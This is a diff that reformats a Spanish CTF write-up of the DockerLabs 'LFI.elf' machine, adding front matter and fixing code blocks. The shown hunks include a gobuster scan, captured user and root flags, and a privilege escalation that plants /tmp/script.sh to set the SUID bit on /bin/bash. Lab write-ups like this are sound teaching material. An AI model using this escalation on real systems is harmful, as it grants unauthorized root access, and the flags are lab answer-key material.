@@ -1,13 +1,18 @@
+---
+title: "LFI.elf - DockerLabs"
+date: 2026-03-05
+author: "Joel Morillas Pagan (Ghxstsec)"
+description: "Resolución paso a paso de la máquina LFI.elf de DockerLabs. Explotación de Local File Inclusion."
+tags: ["DockerLabs", "LFI", "CTF"]
+showFullContent: false
+---
+
 Write-up Máquina LFI.elf de DockerLabs
 ======================================
 
 ![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*9OmGubnfOloCL3s9ymnLEw.png)
 
-[Reference](https://medium.com/@ghxstsec/write-up-m%C3%A1quina-lfi-elf-de-dockerlabs-f68e4c44e21f)
-
 by [Joel Morillas Pagan (Ghxstsec)](https://medium.com/@ghxstsec?source=post_page---byline--f68e4c44e21f---------------------------------------)
-
-
 
 
 Por aquí tenéis mi write-up para la máquina lfi.elf de la plataforma dockerlabs.es
@@ -37,11 +42,13 @@ Así que doy por hecho que va a haber algún tipo de archivo escondido, posiblem
 
 ```
 gobuster dir -u http://172.17.0.2/ -w /usr/share/SecLists-master/Discovery/Web-Content/common.txt -x php,html,txt,svg
-```![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*1sNxelRoiJd4k7WF9w5xEQ.png)
+```
+![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*1sNxelRoiJd4k7WF9w5xEQ.png)
 
 Recuerdo que, si no veis este archivo es porque os habréis olvidado de indicarle las extensiones de los archivos a gobuster, cuidado con eso
 
 el contenido de secret.txt es este:
+
 
 ```
 agent lin,
@@ -163,6 +170,7 @@ lin
 okay, vamos a enumerar el directorio **/home/lin**
 
 ![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*94KFMl_YCmA-E6L1NofiAg.png)```
+```
 cat user.txt
 ed87c5c288f4909dde74cd499acbce92
 ```
@@ -173,7 +181,9 @@ Bueno, podemos ver que el script sistem.py se ejecuta como root, y no podemos ed
 
 Bueno, no es **Library Path Hijacking**, pero podemos ver que cada vez que se ejecuta esta librería, por ejemplo en el script **sistem.py,** se intenta ejecutar el script ubicado en **/tmp/script.sh**, actualmente no existe ningún script en esa ubicación, así que lo creamos nosotros, como se ejecuta como sudo, **vamos a cambiar los permisos del binario /bin/bash**
 
-![captionless image](https://miro.medium.com/v2/resize:fit:786/format:webp/1*HIqjtC-SrY89rOUt-vIiIQ.png)```
+![captionless image](https://miro.medium.com/v2/resize:fit:786/format:webp/1*HIqjtC-SrY89rOUt-vIiIQ.png)
+
+```
 el contenido de script.sh es:
 #!/bin/bash
 chmod u+s /bin/bash
@@ -213,7 +223,7 @@ root.txt
 bash-5.2# cat root.txt
 2d264e1f92a8230d442750d69fba4cc5
 bash-5.2# 
-```
+
 
 Pues hasta ahí llegaría esta máquina, espero que os haya gustado, sé que hay más maneras de pwnear esta máquina, pero yo me decante por esta manera :)
 
